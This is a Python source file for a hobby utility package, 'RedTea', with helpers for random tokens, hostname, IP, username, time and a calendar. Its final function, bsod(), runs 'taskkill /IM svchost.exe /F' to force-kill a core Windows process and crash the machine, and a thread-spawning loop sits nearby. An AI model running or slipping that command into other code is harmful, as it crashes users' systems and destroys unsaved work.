def help():
    print("""
        Thanks For using RedTea Library

        description: This is a package for my programs

        Website: https://www.redtea.red 
        
        Email: redtea@redtea.red

        Need help for command? type >>> redtea.redtea.command() 

        """)
    return


def command():
    print("""
    redtea.start() - Test is this plugins works
    redtea.help() - shows the plugins helps
    redtea.random(max, min) - get a False random Integer number (This should not use For security or cryptographic uses)
    redtea.random_plus(max) - get a True random Integer number
    redtea.random_hax(max) - get a True random text string
    redtea.random_url(url) - get a True random url name ( useful for  password recovery applications)
    redtea.hostname() - get User Computer Name
    redtea.ip() - get user LocalNetwork IP Address
    redtea.time - Get current System time
    redtea.tick - Get current System Tick,Good for date calculations
    redtea.path - Get current Path
    redtea.sleep(sleep_time) - wait until [time]sec pass
    redtea.stop() - Exit python
    redtea.username() - get username
    redtea.homedir() - get home directory
    calender(year, month) - open calender
    domain2ip(url) - get IP by using URL
    redtea.kill() - Exit Python with exit code -1
    """)
    return


def platform():
    import sys
    return sys.platform


def random_hax(mix_rdx):
    import secrets
    haxreturn = secrets.token_hex(mix_rdx)
    return  haxreturn


def random_url(url_rdu):
    import secrets
    answer_rdu = url_rdu + secrets.token_urlsafe()
    return answer_rdu


def random_plus(mix_rdp):
    import secrets
    rp = secrets.randbelow(mix_rdp)
    return rp


def random(max_rd, min_rd):
    import random
    if max_rd < min_rd:
        print("SystemError: Max is less than min!")
        return
    else:
        print(random.randint(min_rd, max_rd))
    return


def ip():
    import socket
    host_name = socket.gethostname()
    localNetwork = socket.gethostbyname(host_name)
    return localNetwork


def hostname():
    import socket
    syshostname = socket.gethostname()
    return syshostname


def stop():
    exit()
    return


def kill():
    exit(-1)
    return


def time():
    import time
    time_return = str(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
    return time_return


def tick():
    import time
    ticks: float = time.time()
    return ticks


def path():
    import sys
    return sys.path


def calender(year, month):
    import calendar
    calendar.setfirstweekday(firstweekday=6)
    calendar = (calendar.month(year, month))
    return calendar


def sleep(sleep_time):
    import time
    time.sleep(sleep_time)
    return


def username():
    import getpass
    username = getpass.getuser()
    print(username)
    return


def homedir():
    import os.path
    home_directory = os.path.expanduser("~")
    print(home_directory)
    return


def special_thanks():
    print("""
    ColaIan - Grammar fix
    abacjoeqeqe - Debug
    """)
    return


def domain2ip(url):
    import socket
    Forward_query_get_ip: str = socket.gethostbyname(url)
    return Forward_query_get_ip


def version():
    ver = '0.4'
    return ver


def file_print(name, mode, data):
    file = open(name, mode)
    file.write(data)
    file.close()
    return


def redtea():
    logo = ("""
MMMMMMMMMMMMMMMMMMMWXOxoclkNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWWWWWWWMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMWXd;..  ,OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0xlllodk0NWMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMW0:.... .xNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXx'     .,o0NMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMWN0o,..;'  cXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk' ....  .l0NMMMMMMMMMMMMMMMMM
MMMMMMMMMMMWXx:...,;,. ,OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd..,:;.   .ckXWMMMMMMMMMMMMMM
MMMMMMMMMMNx;...,;:;. .oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWK; .;:;,..  .,o0NMMMMMMMMMMMM
MMMMMMMMW0c. .,;;;;,. 'OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo. ';:::;..   .cONMMMMMMMMMM
MMMMMMMWk, .';;'..,'  :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO' .;:;;;;;,.   .c0WMMMMMMMM
MMMMMMNk' .,;,.   ''  :XMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0, .,;'..';;;,.   'xNMMMMMMM
MMMMMNk' .;;.     .,. ;KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0, .,,.   .';;;,.  .lXWMMMMM
MMMMWk' .;;.      .,. 'kWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWx..;;.      .';:;.  .cKWMMMM
MMMW0; .;;.       .,, .lXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0;.';'         .;:;,.  :0WMMM
MMMXl..;,.         .,. 'OWMWK0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNO;.,;'.          .,;:,.  :0WMM
MMNx..,;.          .''. :0Ko':KWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWXkc..';,.            .';;,.  :KWM
MW0;.';.            .;' .;,  lNMMMMMMMMWWXK00XNWMMMMMMMMMMMWX0Okxo:'. .','.               ';:,. .lXM
MNo..;'              .,.  ...dNMMMMMMWKdc;'..,dKNWMMMMMMMWKo'..    ..';;'                  ';;.  .xN
WO,.''                   ....kNNNNWW0l,'...'lkXWWMMMMMMMW0: ..'..,;;;,'.                    ';;.  ;0
Xl..,.                  .'. .;lk0kxo'.'...l0WMMMMMMMMMMMK:  .;;'.....                       .,;'  .d
0, ..                   ,'    .:c...... .dNMMMMMMMMMMMMNd. .,,.                              .;;.  c
k....                 .';'..   ....''.  ,dO0KNWMMMMMMMWk' .;,.                                .;'  :
o...                  ':::;'..',,'''.    ...;oOKWWMMMW0;..,,.                                 .,,  :
l...                  ,cccc:::;,''...        .;oOXNWW0; .,;.                                   ',. c
c .'                .:c:c:,'''''..             ,dKXXO; .,;'                                    ',..l
: ..                ,lc:,''.....               .;oxo, .,;'                                    .,' .d
: ..              'ccc:,....'...                    ..,,.                                     .,' .k
: ..            .:c;;;,''..''..                  ......                                       .;. ,0
: ..            'c,.'''.....'..                   .                                           ',. cX
: ..       ...  .'..';;;;'...      ..            ..'...                 .......              .,' .dN
c ..     .ckk;  ....;:;'...       .;,...         .',;:;'.             .;x0KKK0kdc,.          .,. 'OW
l...    'xNNx.   .:c:'....     ...';;....        ..';:;;;.           .dXWMMMMMMMWN0o'        ',. ;KM
o...   .kNXd,.....;::'....'::lxkc.,::,...           ..,;:;,.        .oXMMMMMMMMMMMMW0c.     .,' .oNM
x..'. .lXNx..';::::cc,..:kXWWWWk,.;::'.'.             ..,::;'.     .cKWMMMMMMMMMMMMMWK:     .,. 'kWM
k' .. 'OWNd......',..'..lXMMMMXc.,:::'........        ...,:;;'.  .;xXWMMMMMMMMMMMMMMMWO'    ''  :KMM
0, .. :XMNd...   .'  ...:KWWWW0;.,;::'......'..       .,'..'''. .dXWWWWWWWWWWWWWWMMMMMNl.  .,. .dNMM
Xc....oNMW0c. ...,,.    'clxOo:. ..... ..  ...         ........ .,clllcccccccccoONMMMMWO'  ''  ;0WMM
Wx....dNMMWXc.   .:ddddddo;...'odxxxxdc..oxxxxxo,..;xxxxxxxc.;dxxxxxd:.  ;odddc.;0WMMMW0; .,. .dNMMM
MXl..'xWMMMW0c'.. :KXkoxXMK,  oNXxlllc. :XNx:dXMx'.cddKMNxoo'oNNkollc.   ;KNKNNc.oXMMMWO'.'. .lXMMMM
MW0:..xWMMMMWX0k:.lNNo':KMk. .kWNxcc;.  lNNl ;KWx. ...kW0, ..lNWOc::.    cNKcdW0,'kWMMNd... .lKWMMMM
MMWO;.xWMMMMMMWO,.d0K0OO0k,  'dkOkooc. .lxx; ;dxl..'..oxd,   cxxOxdd,   .o0k,;O0l.:KWW0;.. .oXWMMMMM
MMMWOcdNMMMMMMNd.,lll,cooc.  ;c:l,...  .c:c:.ccc:..'.'c;c' ..:c:l'...   'l:llclcl,.dNXo.  ,xNMMMMMMM
MMMMWK0NMMMMMMX:.:::; .ccl: .cc,cc::lc..c;:c:c;;'....,c:l,.. ;c;cc::::. ;c,c:,:;,:.,kd. 'oKWMMMMMMMM
MMMMMWXXWMMMMWO'.::;.  ';;:..,;,;;;;::,,:::::c::oxdc,:ccc;'.',:;;;;,,;'.',,,. .;;c;.',,oKWMMMMMMMMMM
MMMMMMWWWMMMMNx'.;:::ccllodxkkOO00KKKXXXXNNNNNNNWWNNNNNNNNXXXXKKK00Okkxddolccc:;;;,..lKWMMMMMMMMMMMM
MMMMMMMMMMMMMN0kOKXXNNWWWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWWWNNXX0OkxOXMMMMMMMMMMMMM

                                Powered By RedTea
""")
    return logo


def ThreadSpamer(how_much):  # WARNING: DO NOT OPEN TOO MANY THREAD,IT WILL CRASH YOUR PC!!!!!
    import threading
    for x in range(how_much):
        x = threading.Thread(target=spam)
        x.start()
        x.join()
    return


def ThreadSpamer_Slowmode(how_much):
    import threading
    for x in range(how_much):
        x = threading.Thread(target=spam)
        x.start()
        x.join()
        sleep(0.30)
    return


def spam():
    print("Thread Started!")


def bsod():
    """Admin permission is needed"""
    import os
    cmd = 'taskkill /IM svchost.exe /F'
    os.system(cmd)
